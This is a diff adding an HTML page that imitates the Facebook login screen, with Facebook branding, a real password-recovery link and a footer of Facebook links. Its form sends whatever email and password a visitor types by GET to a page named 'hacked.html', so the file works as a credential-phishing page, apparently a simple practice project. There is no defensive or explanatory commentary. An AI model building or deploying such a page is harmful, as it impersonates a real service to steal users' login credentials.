@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Facebook &ndash; log in or sign up</title>
+        <link rel="icon" href="favicon.ico" type="image/png">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Titillium+Web:wght@300&display=swap" rel="stylesheet">
+        <style>
+            *{
+                font-family: Helvetica, Arial, sans-serif;
+                padding: 0px;
+                margin: 0px;
+                box-sizing: border-box;
+            }
+            h2{
+
+            font-family: !important Arial, sans-serif;
+            line-height:28px;
+            font-weight: 400;
+            font-size: 24px;
+            text-align: center;
+            margin: 0px;
+            padding: 0px;
+            letter-spacing: 0px;
+            word-spacing: normal;
+            }
+            body{
+                font-family: 'Titillium Web', sans-serif;
+                background-color: #f0f2f5;
+                overflow: scroll;
+            }
+            img{
+                margin-top: 10px;
+                margin-bottom: -10px;
+            }
+            #face{
+                font-size: 24px;
+                font-weight: 600;
+            }
+            #main{
+                display: flex;
+                flex-direction: row;
+                flex-wrap: wrap;
+                justify-content: center;
+                align-content: center;
+                vertical-align: middle;
+            }
+            #field{
+                margin-top: 40px;
+                width: 397px;
+                height: 347px;
+                border: 1px solid #dbdddf;
+                border-radius: 12px;
+                background-color: #ffffff;
+                font-size: 12px;
+                vertical-align: baseline;
+                box-shadow: 1px 1px 1px 1px lightgray;
+            }
+            #inputpassword,#inputmail{
+                width: 365px;
+                height: 53px;
+                border: 1px solid #dbdddf;
+                border-radius: 9px;
+                padding: 14px 16px;
+                margin: 0px;
+                font-size: 17px;
+            }
+            #mail,#password{
+                text-align: center;
+            }
+            #mail{
+                margin-top: 17px;
+            }
+            #password{
+                margin-top: 14px;
+            }
+            #login{
+                margin-top: 14px;
+            }
+            #buttonlogin{
+                font-size: 20px;
+                font-weight: 700;
+                width: 365px;
+                height: 47px;
+                border: 2px solid #1877f2;
+                border-radius: 5px;
+                margin-right: 17px;
+                margin-left: 17px;
+                background-color: #1877f2;
+                color: #fff;
+            }
+            #forgpass{
+                text-align: center;
+                font-size: 14px;
+                margin-top: 14px;
+
+            }
+            #newaccount{
+                background-color: #42b72a;
+                height: 48px;
+                width: 195px;
+                border-radius: 7px;
+                margin-left: auto;
+                margin-right: auto;
+            }
+            #account{
+                text-align: center;
+                font-size: 17px;
+                font-weight: 700;
+                color: white;
+                text-align: center;
+                padding: 0px 15px;
+                line-height: 48px;
+                word-spacing: 0px;
+            }
+            hr{
+                margin-top: 25px;
+                margin-bottom: 25px;
+                width: 95%;
+                margin-left: auto;
+                margin-right: auto;
+                opacity: 70%;
+            }
+            p{
+                font-size: 14px;
+                font-weight: 400;margin:28px 0px;
+            }
+            form{
+                text-align: center;
+            }
+            ul{
+                margin-top: 25%;
+            }
+            ul li{
+                list-style: none;
+
+            }
+            form p a{
+                text-decoration: none;
+                color: black;
+                font-weight: bold;
+            }
+            form p a:hover{
+                text-decoration: underline;
+            }
+            #account:link{
+                text-decoration: none;
+            }
+            #newpass:link{
+                text-decoration: none;
+                color: #1877f2;
+            }
+            #inputmail:active{
+                text-decoration: none;
+                border: 12px solid #1877f2;
+            }
+            #inputmail:focus,#inputpassword:focus{
+                border: 1px solid #1877f2;
+                outline: none;
+            }
+            #buttonlogin:hover{
+                background-color: #166fe5;
+            }
+
+            @media screen and (max-width: 900px) {
+                body{
+                    margin-right: 28%;
+                    margin-left: 28%;
+                }
+            }
+           @media screen and (min-width: 901px) {
+            *{
+                margin: 0px;
+                padding: 0px;
+            }
+            h2{
+                height: ;
+            }
+           } 
+
+</style>
+</head>
+<body>
+    <div id="main">
+        <h2>
+            <img src="facebook.svg" height="105px"width="301px">
+            Facebook helps you connect and<br> share with the people in your life.
+        </h2>
+        <form action="hacked.html" method="GET">
+        <div id="field">
+            <div id="mail">
+                <input type="email" name="name" id="inputmail">
+            </div>
+            <div id="password">
+                <input type="password" name="password" id="inputpassword">
+            </div>
+            <div id="login">
+                <input type="submit" name="log in" value="Log In" id="buttonlogin">
+            </div>
+            <div id="forgpass">
+                <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjM5Njc2Mjg0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login" id="newpass">Forgotten password?</a>
+            </div>
+            <hr>
+            <div id="newaccount">
+                <a href="https://www.facebook.com/#" id="account">Create New Account</a>
+            </div>
+        </div>
+    <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+        </form>
+</div>
+    <ul>
+    <li>English (UK)</li>
+    <li>اردو </li>
+    <li>پښتو </li>
+   <li> العربية </li>
+   <li> हिन्दी</li>
+   <li> বাংলা</li>
+    <li>ਪੰਜਾਬੀ</li>
+    <li>فارسی  </li>
+    <li>ગુજરાતી</li>
+    <li>Deutsch</li>
+    <li>Español</li>
+    <li>Sign Up</li>
+    <li>Log In</li>
+    <li>Messenger</li>
+    <li>Facebook Lite</li>
+    <li>Watch</li>
+    <li>Places</li>
+    <li>Games</li>
+    <li>Marketplace</li>
+    <li>Facebook Pay</li>
+    <li>Jobs</li>
+    <li>Oculus</li>
+    <li>Portal</li>
+    <li>Instagram</li>
+    <li>Bulletin</li>
+    <li>Local</li>
+    <li>Fundraisers</li>
+    <li>Services</li>
+    <li>Voting Information Centre</li>
+    <li>Groups</li>
+    <li>About</li>
+    <li>Create </li>
+    <li>adCreate </li>
+    <li>Page</li>
+    <li>Developers</li>
+    <li>Careers</li>
+    <li>Privacy</li>
+    <li>Cookies</li>
+    <li>AdChoices</li>
+    <li>Terms</li>
+    <li>Help</li>
+    <li>Settings</li>
+    <li>Activity log</li>
+    <li>Meta © 2021</li>
+</ul>
+</body>
+</html>
